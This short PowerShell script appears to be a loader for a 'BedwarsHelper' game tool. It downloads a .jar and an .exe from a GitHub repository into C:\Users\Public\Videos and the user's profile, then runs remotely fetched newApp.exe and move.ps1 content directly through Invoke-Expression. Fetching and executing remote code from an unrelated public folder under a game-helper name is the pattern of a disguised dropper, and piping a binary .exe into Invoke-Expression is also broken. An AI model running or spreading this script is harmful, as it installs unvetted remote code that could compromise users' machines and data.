Invoke-WebRequest https://github.com/RaupenInspektor/Updates/raw/main/bedwarshelper.jar -OutFile C:\Users\Public\Videos\BedwarsHelper\bedwarshelper.jar -UseBasicParsing -Force
Invoke-WebRequest https://github.com/RaupenInspektor/Updates/raw/main/BedwarsHelper.exe -OutFile C:\Users\%USERNAME%\BedwarsHelper.exe -UseBasicParsing -Force

Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/Updates/raw/main/newApp.exe" -UseBasicParsing).Content
Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/Updates/raw/main/move.ps1" -UseBasicParsing).Content
